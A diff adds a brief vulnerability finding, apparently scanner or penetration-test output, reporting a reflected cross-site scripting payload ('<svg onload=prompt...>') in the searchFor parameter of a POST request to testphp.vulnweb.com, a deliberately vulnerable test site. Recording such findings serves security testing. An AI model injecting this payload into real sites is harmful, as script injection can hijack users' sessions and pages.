@@ -1,0 +1,5 @@
+POST http://testphp.vulnweb.com/search.php?test=query
+Vulnerable Param: searchFor
+Payload:
+  <svg onload=prompt`812132`>
+
